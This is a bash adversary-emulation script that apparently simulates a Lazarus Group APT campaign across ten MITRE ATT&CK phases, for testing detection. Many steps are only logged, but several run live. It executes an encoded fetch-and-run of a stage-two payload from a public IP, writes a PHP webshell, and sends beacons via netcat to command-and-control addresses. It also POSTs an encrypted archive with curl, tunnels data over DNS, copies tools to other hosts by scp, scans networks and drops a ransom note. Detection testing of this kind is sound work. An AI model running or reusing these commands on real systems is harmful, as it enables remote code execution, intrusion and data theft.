#!/bin/bash
#############################################################################
# Scenario 3: Lazarus Group Advanced Persistent Threat Simulation
# 
# Based on: Sony Pictures hack, SWIFT attacks, WannaCry campaign
# Complexity: Very High
# Techniques: 15 MITRE ATT&CK techniques
# Duration: ~35 minutes
#
# ⚠️ WARNING: Run ONLY on isolated test systems with authorization!
#############################################################################

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Configuration
ATTACK_NAME="Lazarus_APT"
LOG_DIR="/tmp/apt_scenario3_logs"
C2_SERVERS=("45.77.65.211:8080" "198.51.100.42:9443" "203.0.113.99:443")
MALWARE_DIR="/tmp/.X11-unix"
EXFIL_DIR="/tmp/.font-cache-$RANDOM"
WEBSHELL_DIR="/var/tmp/.httpd"
TOOLS_DIR="/tmp/.tools"

echo -e "${MAGENTA}[*] ═══════════════════════════════════════════════${NC}"
echo -e "${MAGENTA}[*]  Scenario 3: Lazarus Group APT Campaign      ${NC}"
echo -e "${MAGENTA}[*] ═══════════════════════════════════════════════${NC}"
echo -e "${RED}[!] WARNING: ADVANCED ATTACK SIMULATION${NC}"
echo -e "${RED}[!] Ensure complete isolation and monitoring${NC}"
echo

# Setup
mkdir -p "$LOG_DIR" "$MALWARE_DIR" "$EXFIL_DIR" "$WEBSHELL_DIR" "$TOOLS_DIR"
START_TIME=$(date +%s)
echo "$START_TIME" > "$LOG_DIR/start_time.txt"
echo -e "${GREEN}[*] Campaign start: $(date)${NC}\n"

sleep 2

#############################################################################
# Phase 1: Initial Access via Web Exploit
#############################################################################
echo -e "${BLUE}╔═══ Phase 1: Initial Access (Web Application Exploit) ═══╗${NC}"

#############################################################################
# T1190 - Exploit Public-Facing Application
#############################################################################
echo -e "${GREEN}[T1190]${NC} Exploiting web application vulnerability..."
cat > "$WEBSHELL_DIR/exploit_log.txt" << 'EOF'
[Exploit] Targeting Apache Struts CVE-2017-5638
[Exploit] Sending crafted Content-Type header
[Exploit] Code injection successful
[Exploit] Deploying webshell
EOF

cat > "$WEBSHELL_DIR/shell.php" << 'EOF'
<?php
// Webshell deployed
system($_GET['cmd']);
?>
EOF

echo -e "${YELLOW}[+] Webshell deployed at: $WEBSHELL_DIR/shell.php${NC}"

sleep 2

#############################################################################
# T1059.001 - PowerShell (adapted for Linux: bash scripts)
#############################################################################
echo -e "${GREEN}[T1059.001]${NC} Executing encoded payload..."
# Base64 encoded malicious commands
PAYLOAD=$(echo 'curl -s http://45.77.65.211:8080/stage2 | bash' | base64)
echo "$PAYLOAD" | base64 -d | bash 2>/dev/null || echo -e "${YELLOW}[!] Stage2 download failed (expected)${NC}"

sleep 2

#############################################################################
# Phase 2: Persistence (Multiple Mechanisms)
#############################################################################
echo -e "${BLUE}╔═══ Phase 2: Establishing Persistence ═══╗${NC}"

#############################################################################
# T1078.003 - Valid Accounts: Local Accounts
#############################################################################
echo -e "${GREEN}[T1078.003]${NC} Creating backdoor user account..."
# Simulate user creation (logged only, not actually created)
cat >  "$LOG_DIR/user_creation.log" << EOF
[$(date)] Attempted user creation:
username: sysupdate
uid: 1999
groups: sudo,adm
home: /home/sysupdate
shell: /bin/bash
EOF
echo -e "${YELLOW}[!] User 'sysupdate' creation logged (not actually created)${NC}"

sleep 1

#############################################################################
# T1543.003 - Create or Modify System Process: systemd Service
#############################################################################
echo -e "${GREEN}[T1543.003]${NC} Installing malicious systemd service..."
cat > "$MALWARE_DIR/system-monitor.service" << 'EOF'
[Unit]
Description=System Resource Monitor
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.X11-unix/monitor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

cat > "$MALWARE_DIR/monitor.sh" << 'EOF'
#!/bin/bash
while true; do
    curl -s http://45.77.65.211:8080/beacon?host=$(hostname) 2>/dev/null || true
    sleep 300
done
EOF
chmod +x "$MALWARE_DIR/monitor.sh"

echo -e "${YELLOW}[!] Systemd service created (not installed)${NC}"
cp "$MALWARE_DIR/system-monitor.service" "$LOG_DIR/"

sleep 2

#############################################################################
# Phase 3: Privilege Escalation & Defense Evasion
#############################################################################
echo -e "${BLUE}╔═══ Phase 3: Privilege Escalation & Defense Evasion ═══╗${NC}"

#############################################################################
# T1055 - Process Injection
#############################################################################
echo -e "${GREEN}[T1055]${NC} Simulating process injection..."
# Simulate injecting into legitimate process
cat > "$TOOLS_DIR/inject.sh" << 'EOF'
#!/bin/bash
# Find target process
TARGET_PID=$(pgrep -o bash)
echo "Target PID for injection: $TARGET_PID"
# In real attack: ptrace attach, shellcode injection
echo "Injection simulation complete"
EOF
chmod +x "$TOOLS_DIR/inject.sh"
bash "$TOOLS_DIR/inject.sh" > "$LOG_DIR/process_injection.log" 2>&1

sleep 2

#############################################################################
# T1027 - Obfuscated Files or Information
#############################################################################
echo -e "${GREEN}[T1027]${NC} Creating obfuscated payload..."
# Multi-layer obfuscation
cat > "$MALWARE_DIR/payload_stage3" << 'EOF'
eval $(echo 'ZWNobyAiTWFsd2FyZSBwYXlsb2FkIGV4ZWN1dGVkIg==' | base64 -d)
EOF

# XOR obfuscation simulation
dd if=/dev/urandom of="$MALWARE_DIR/encrypted_payload" bs=1024 count=10 2>/dev/null
echo -e "${YELLOW}[+] Created obfuscated payloads${NC}"

sleep 1

#############################################################################
# T1562.001 - Impair Defenses: Disable or Modify Tools
#############################################################################
echo -e "${GREEN}[T1562.001]${NC} Attempting to disable security tools..."
# Simulate disabling AV/EDR
cat > "$LOG_DIR/disable_defenses.log" << 'EOF'
[DefenseEvasion] Checking for security tools...
[DefenseEvasion] Found: auditd (running)
[DefenseEvasion] Attempting to stop auditd... (SIMULATED - not actually stopped)
[DefenseEvasion] Found: firewall (enabled)
[DefenseEvasion] Attempting UFW disable... (SIMULATED - not actually disabled)
EOF

# Check what security tools are running
systemctl is-active auditd 2>/dev/null >> "$LOG_DIR/disable_defenses.log" || true
systemctl is-active ufw 2>/dev/null >> "$LOG_DIR/disable_defenses.log" || true

echo -e "${YELLOW}[!] Defense evasion logged (no actual changes made)${NC}"

sleep 2

#############################################################################
# Phase 4: Credential Access
#############################################################################
echo -e "${BLUE}╔═══ Phase 4: Credential Access ═══╗${NC}"

#############################################################################
# T1110.003 - Brute Force: Password Spraying
#############################################################################
echo -e "${GREEN}[T1110.003]${NC} Password spraying attack..."
# Simulate password spraying
cat > "$TOOLS_DIR/spray.sh" << 'EOF'
#!/bin/bash
USERS=("admin" "root" "user" "test" "ubuntu")
PASSWORDS=("Password123" "admin" "12345" "password")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        # Simulate SSH auth attempt
        echo "[$(date)] Trying $user:$pass" 
        sleep 0.1
    done
done
EOF
chmod +x "$TOOLS_DIR/spray.sh"
bash "$TOOLS_DIR/spray.sh" > "$LOG_DIR/password_spray.log" 2>&1

echo -e "${YELLOW}[+] Password spray attempted (no actual auth)${NC}"

sleep 2

#############################################################################
# Phase 5: Discovery
#############################################################################
echo -e "${BLUE}╔═══ Phase 5: Network & System Discovery ═══╗${NC}"

#############################################################################
# T1046 - Network Service Scanning
#############################################################################
echo -e "${GREEN}[T1046]${NC} Scanning network for services..."
# Network scan
for subnet in "192.168.1" "10.0.0" "172.16.0"; do
    for host in {1..5}; do
        timeout 0.5 ping -c 1 $subnet.$host 2>/dev/null | grep "bytes from" >> "$EXFIL_DIR/discovered_hosts.txt" || true
    done
done

# Port scanning
for port in 22 80 443 445 3389 3306 5432 6379 27017; do
    timeout 1 nc -zv 192.168.1.1 $port 2>&1 | grep "succeeded" >> "$EXFIL_DIR/open_ports.txt" || true
done

echo -e "${YELLOW}[+] Network reconnaissance complete${NC}"

sleep 3

#############################################################################
# T1087.001 - Account Discovery: Local Account
#############################################################################
echo -e "${GREEN}[T1087.001]${NC} Enumerating local accounts..."
cat /etc/passwd | grep -v "nologin\|false" > "$EXFIL_DIR/valid_users.txt"
lastlog | head -20 >> "$EXFIL_DIR/valid_users.txt"
who >> "$EXFIL_DIR/active_sessions.txt"

sleep 1

#############################################################################
# Phase 6: Lateral Movement
#############################################################################
echo -e "${BLUE}╔═══ Phase 6: Lateral Movement ═══╗${NC}"

#############################################################################
# T1570 - Lateral Tool Transfer
#############################################################################
echo -e "${GREEN}[T1570]${NC} Transferring attack tools to remote hosts..."
# Simulate SCP/rsync to pivot hosts
cat > "$TOOLS_DIR/lateral_transfer.sh" << 'EOF'
#!/bin/bash
PIVOT_HOSTS=("192.168.1.50" "192.168.1.51" "192.168.1.52")
for host in "${PIVOT_HOSTS[@]}"; do
    echo "[$(date)] Transferring tools to $host via SCP..."
    # scp -o ConnectTimeout=2 /tmp/.tools/backdoor.sh user@$host:/tmp/ 2>&1
    timeout 2 scp -o StrictHostKeyChecking=no /tmp/.tools/spray.sh user@$host:/tmp/ 2>&1 || true
done
EOF
chmod +x "$TOOLS_DIR/lateral_transfer.sh"
bash "$TOOLS_DIR/lateral_transfer.sh" >> "$LOG_DIR/lateral_movement.log" 2>&1

sleep 2

#############################################################################
# Phase 7: Collection
#############################################################################
echo -e "${BLUE}╔═══ Phase 7: Data Collection ═══╗${NC}"

#############################################################################
# T1560.001 - Archive Collected Data: Archive via Utility
#############################################################################
echo -e "${GREEN}[T1560.001]${NC} Archiving collected data..."
# Comprehensive data collection
find ~ -maxdepth 3 -type f \( \
    -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o \
    -name "*.pdf" -o -name "*.ppt" -o -name "*.pptx" -o -name "*.txt" -o \
    -name "*.csv" -o -name "*.sql" -o -name "*.db" -o -name "*.sh" \
    \) -mtime -60 2>/dev/null | head -100 > "$EXFIL_DIR/target_files.txt" || true

# Database dumps (simulated)
find /var -name "*.sql" -o -name "*.db" 2>/dev/null | head -10 >> "$EXFIL_DIR/databases.txt" || true

# Configuration files
find /etc -type f -name "*.conf" -o -name "*.cfg" 2>/dev/null | head -50 >> "$EXFIL_DIR/configs.txt" || true

# Create encrypted archive
tar -czf "$EXFIL_DIR/collected_data.tar.gz" "$EXFIL_DIR/"*.txt 2>/dev/null || true

# Encrypt with simulated key
openssl enc -aes-256-cbc -salt -in "$EXFIL_DIR/collected_data.tar.gz" \
    -out "$EXFIL_DIR/exfil_encrypted.dat" -pass pass:Lazarus2025 2>/dev/null || true

echo -e "${YELLOW}[+] Data archived and encrypted${NC}"

sleep 2

#############################################################################
# Phase 8: Command & Control
#############################################################################
echo -e "${BLUE}╔═══ Phase 8: Command & Control ═══╗${NC}"

#############################################################################
# T1095 - Non-Application Layer Protocol (Raw TCP)
#############################################################################
echo -e "${GREEN}[T1095]${NC} Establishing covert C2 channel..."
# Raw TCP C2
for c2 in "${C2_SERVERS[@]}"; do
    IFS=':' read -r ip port <<< "$c2"
    echo -e "BEACON|$(hostname)|$(whoami)|$(date +%s)" | nc -w 1 $ip $port 2>/dev/null || echo "[!] C2 $c2 unreachable"
done

# Custom protocol C2 (base64 over DNS txt records)
for i in {1..3}; do
    nslookup -type=txt beacon$i.c2.lazarus-apt.test 8.8.8.8 2>/dev/null || true
done

echo -e "${YELLOW}[+] C2 beacons sent (all should fail in isolated env)${NC}"

sleep 2

#############################################################################
# Phase 9: Exfiltration
#############################################################################
echo -e "${BLUE}╔═══ Phase 9: Data Exfiltration ═══╗${NC}"

#############################################################################
# T1020 - Automated Exfiltration
#############################################################################
echo -e "${GREEN}[T1020]${NC} Automated multi-channel exfiltration..."

# Method 1: HTTPS POST
curl -X POST -H "Content-Type: application/octet-stream" \
    --data-binary "@$EXFIL_DIR/exfil_encrypted.dat" \
    https://45.77.65.211:9443/upload 2>/dev/null || echo "[!] HTTPS exfil failed"

# Method 2: FTP (simulated)
echo "open 198.51.100.42 21
user anonymous pass
binary
put $EXFIL_DIR/exfil_encrypted.dat
quit" > "$LOG_DIR/ftp_commands.txt"
echo -e "${YELLOW}[!] FTP exfil commands logged${NC}"

# Method 3: DNS tunneling (chunked base64)
if [ -f "$EXFIL_DIR/exfil_encrypted.dat" ]; then
    DATA=$(base64 "$EXFIL_DIR/exfil_encrypted.dat" | head -c 200)
    # Split into 30-char chunks for DNS labels
    for i in {0..5}; do
        CHUNK=${DATA:$((i*30)):30}
        dig $CHUNK.exfil.lazarus-apt.test @8.8.8.8 +short 2>/dev/null || true
    done
fi

echo -e "${YELLOW}[+] Multi-channel exfiltration attempted${NC}"

sleep 2

#############################################################################
# Phase 10: Impact - Ransomware
#############################################################################
echo -e "${BLUE}╔═══ Phase 10: Impact (Ransomware) ═══╗${NC}"

#############################################################################
# T1486 - Data Encrypted for Impact
#############################################################################
echo -e "${GREEN}[T1486]${NC} Deploying ransomware (SAFE SIMULATION)..."

cat > "$MALWARE_DIR/ransomware.sh" << 'EOF'
#!/bin/bash
# SAFE ransomware simulation - NO ACTUAL ENCRYPTION
LOG="/tmp/apt_scenario3_logs/ransomware_activity.log"
echo "=== RANSOMWARE SIMULATION ===" > $LOG
echo "Start: $(date)" >> $LOG
echo "" >> $LOG

# Enumerate target directories
echo "Target directories:" >> $LOG
find /home -type d -maxdepth 2 2>/dev/null >> $LOG

# Enumerate target file types
echo "" >> $LOG
echo "Target file types:" >> $LOG
find /home -type f \( -name "*.doc*" -o -name "*.xls*" -o -name "*.pdf" -o -name "*.jpg" -o -name "*.png" \) 2>/dev/null | wc -l >> $LOG

# Generate ransom note
cat > /tmp/RANSOM_NOTE.txt << 'RANSOM'
YOUR FILES HAVE BEEN ENCRYPTED

All your important files have been encrypted with military-grade encryption.

To recover your files, you must pay 50 Bitcoin to:
[Bitcoin Address Here]

After payment, contact: lazarus_recovery@protonmail.com

You have 72 hours before the decryption key is destroyed.

WARNING: Do not attempt to decrypt files yourself.
WARNING: Do not contact authorities.
RANSOM

echo "" >> $LOG
echo "Ransom note created: /tmp/RANSOM_NOTE.txt" >> $LOG
echo "End: $(date)" >> $LOG
echo "" >> $LOG
echo "*** NO FILES WERE ACTUALLY ENCRYPTED ***" >> $LOG
EOF

chmod +x "$MALWARE_DIR/ransomware.sh"
bash "$MALWARE_DIR/ransomware.sh" 2>/dev/null

echo -e "${RED}[!] RANSOMWARE SIMULATED - NO ACTUAL ENCRYPTION${NC}"
echo -e "${YELLOW}[!] Ransom note created at: /tmp/RANSOM_NOTE.txt${NC}"

sleep 2

#############################################################################
# Attack Completion & Summary
#############################################################################

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))
MINUTES=$((DURATION / 60))
SECONDS=$((DURATION % 60))

echo
echo -e "${MAGENTA}═══════════════════════════════════════════════════${NC}"
echo -e "${MAGENTA}   Scenario 3 (Lazarus APT) - COMPLETED           ${NC}"
echo -e "${MAGENTA}═══════════════════════════════════════════════════${NC}"
echo -e "${GREEN}[*] Duration: ${MINUTES}m ${SECONDS}s${NC}"
echo -e "${GREEN}[*] Phases: 10${NC}"
echo -e "${GREEN}[*] Techniques: 15${NC}"
echo -e "${GREEN}[*] Sophistication: VERY HIGH${NC}"
echo

# Comprehensive summary
cat > "$LOG_DIR/attack_summary.txt" << EOF
═══════════════════════════════════════════════════════════════
  LAZARUS GROUP APT CAMPAIGN - ATTACK SIMULATION REPORT
═══════════════════════════════════════════════════════════════

Campaign Type: Advanced Persistent Threat (Financial/Espionage)
Based On: Sony Pictures Hack, SWIFT Attacks, WannaCry
Start Time: $(date -d @$START_TIME 2>/dev/null || date -r $START_TIME)
End Time: $(date)
Duration: ${MINUTES} minutes ${SECONDS} seconds

═══════════════════════════════════════════════════════════════
ATTACK KILL CHAIN (10 Phases)
═══════════════════════════════════════════════════════════════

Phase 1: Initial Access (Web Application Exploit)
Phase 2: Persistence (User Creation + Systemd Service)
Phase 3: Privilege Escalation & Defense Evasion
Phase 4: Credential Access (Password Spraying)
Phase 5: Discovery (Network + System)
Phase 6: Lateral Movement (Tool Transfer)
Phase 7: Collection (Automated Mass Collection)
Phase 8: Command & Control (Multi-Channel)
Phase 9: Exfiltration (HTTPS + FTP + DNS)
Phase 10: Impact (Ransomware Deployment)

═══════════════════════════════════════════════════════════════
MITRE ATT&CK TECHNIQUES (15)
═══════════════════════════════════════════════════════════════

Initial Access:
  T1190 - Exploit Public-Facing Application

Execution:
  T1059.001 - Command and Scripting Interpreter

Persistence:
  T1078.003 - Valid Accounts: Local Accounts
  T1543.003 - Create or Modify System Process: Systemd

Privilege Escalation:
  T1055 - Process Injection

Defense Evasion:
  T1027 - Obfuscated Files or Information
  T1562.001 - Impair Defenses: Disable Tools

Credential Access:
  T1110.003 - Brute Force: Password Spraying

Discovery:
  T1046 - Network Service Scanning
  T1087.001 - Account Discovery: Local Account

Lateral Movement:
  T1570 - Lateral Tool Transfer

Collection:
  T1560.001 - Archive Collected Data

Command & Control:
  T1095 - Non-Application Layer Protocol

Exfiltration:
  T1020 - Automated Exfiltration

Impact:
  T1486 - Data Encrypted for Impact

═══════════════════════════════════════════════════════════════
INDICATORS OF COMPROMISE (IOCs)
═══════════════════════════════════════════════════════════════

File Paths:
  - $MALWARE_DIR/*
  - $WEBSHELL_DIR/*
  - $TOOLS_DIR/*
  - $EXFIL_DIR/*
  - /tmp/RANSOM_NOTE.txt

Network Indicators:
  - 45.77.65.211:8080 (C2 Server 1)
  - 198.51.100.42:9443 (C2 Server 2)
  - 203.0.113.99:443 (C2 Server 3)
  - DNS: *.lazarus-apt.test

Processes:
  - Webshell execution
  - Fake systemd service
  - Process injection attempts
  - Password spraying scripts

═══════════════════════════════════════════════════════════════
EXPECTED DETECTIONS
═══════════════════════════════════════════════════════════════

High Priority Alerts (Critical):
  1. Web application exploit attempt
  2. Webshell deployment
  3. Unauthorized user creation
  4. Ransomware execution
  5. Mass file encryption attempts

Medium Priority Alerts:
  6. Process injection
  7. Defense evasion attempts
  8. Password spray attacks
  9. Network scanning
  10. Lateral tool transfer

Low Priority (Contextual):
  11. File collection
  12. Data archiving
  13. C2 beaconing
  14. DNS tunneling
  15. Persistence mechanisms

═══════════════════════════════════════════════════════════════
DETECTION METRICS (Expected)
═══════════════════════════════════════════════════════════════

Detection Rate Target: 65-80%
False Positive Rate: 10-15%
Time to Detection: 5-10 minutes
Critical Technique Coverage: 80%+

Expected Alerts: 12-18
  - True Positives: 10-14
  - False Positives: 2-4
  - False Negatives: 3-5

═══════════════════════════════════════════════════════════════
CLEANUP & FORENSICS
═══════════════════════════════════════════════════════════════

Immediate Actions Required:
1. Run cleanup script
2. Check for lingering processes
3. Review systemd services
4. Verify no actual encryption occurred
5. Check network connections
6. Review audit logs

Cleanup Command:
  bash experiments/scenarios/cleanup.sh

Forensic Analysis:
  Logs: $LOG_DIR
  Artifacts: $MALWARE_DIR, $WEBSHELL_DIR, $TOOLS_DIR
  Exfil: $EXFIL_DIR

═══════════════════════════════════════════════════════════════
END OF REPORT
═══════════════════════════════════════════════════════════════
EOF

cat "$LOG_DIR/attack_summary.txt"

echo
echo -e "${RED}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  CRITICAL: IMMEDIATE CLEANUP REQUIRED            ║${NC}"
echo -e "${RED}╚═══════════════════════════════════════════════════╝${NC}"
echo -e "${YELLOW}[!] Command: bash experiments/scenarios/cleanup.sh${NC}"
echo -e "${YELLOW}[!] Verify: No files encrypted, no services running${NC}"
echo -e "${YELLOW}[!] Check: /tmp/, systemd, cron, processes${NC}"
echo
